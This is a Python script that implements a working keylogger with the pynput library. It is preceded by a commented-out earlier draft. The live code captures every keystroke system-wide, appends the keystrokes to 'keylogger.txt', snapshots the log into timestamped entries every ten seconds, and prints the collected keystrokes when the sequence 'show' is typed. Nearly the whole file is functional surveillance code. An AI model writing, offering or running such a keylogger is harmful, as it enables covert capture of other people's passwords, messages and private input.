# import time
# import datetime
# from pynput.keyboard import Listener
#
# dict_key = {}
# my_list = []
# list_pass = ['4','4','4','4']
# def on_press(key):
#     my_list.append(special_key_conversions(key))
#     password(special_key_conversions(key))
#
# def special_key_conversions(key):
#
#     dict_special = {  'Key.space': ' ',  '<96>' : '0', '<97>': '1', '<98>': '2','<99>':'3','<100>':'4','<101>':'5','<102>':'6','<103>':'7','<104>':'8'
#                       ,'<105>':'9','Key.enter':'\n','Key.tab':'\t'}
#     if str(key) in dict_special:
#         key1 = dict_special[str(key)]
#         return key1
#     else:
#         key1 = str(key)[1]
#         return key1
#
# def dict_time(lst):
#     dict_key[f'___{datetime.datetime.now()}___'] = lst[:]
#     lst[:] = []
#     # print(dict_key)
#
# def input_condition():
#     pass
#
#
# def password(key1):
#     print(list_pass)
#     print(list_pass == ['s','h','o','w'])
#     if list_pass == ['s','h','o','w']:
#         print(dict_key)
#     else:
#         list_pass.remove(list_pass[0])
#         print(list_pass)
#         list_pass.append(key1)
#         print(list_pass)
#
#
#
# listener = Listener(on_press=on_press,on_release=input_condition())
#
# listener.start()
# while True:
#     time.sleep(60)
#     dict_time(my_list)
#
import time
import datetime
from pynput.keyboard import Listener, Key, KeyCode

dict_key = {}
list_pass = ['4', '4', '4', '4']

def on_press(key):
    key_converted = special_key_conversions(key)
    if key_converted:
        with open('keylogger.txt' , 'a') as file:
            file.write(special_key_conversions(key))
        password(key_converted)

def special_key_conversions(key):
    dict_special = {
        Key.space: ' ', Key.enter: '\n', Key.tab: '\t'
    }
    if key in dict_special:
        return dict_special[key]
    if isinstance(key, KeyCode) and key.vk is not None:
        if 96 <= key.vk <= 105:
            return str(key.vk - 96)
    if hasattr(key, 'char') and key.char is not None:
        return key.char

    return None

def dict_time(file):
    with open(file , 'r') as file:
        content = file.read()
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        dict_key[timestamp] = content


def password(key1):
    global list_pass

    print(f"Current list_pass: {list_pass}")
    if list_pass == ['s', 'h', 'o', 'w']:
        print("Password detected! Displaying key logs:")
        print(dict_key)

    list_pass.pop(0)
    list_pass.append(key1)

listener = Listener(on_press=on_press, on_release=None)
listener.start()

try:
    while True:
        time.sleep(10)
        dict_time('keylogger.txt')
except KeyboardInterrupt:
    listener.stop()
    print("Listener stopped.")
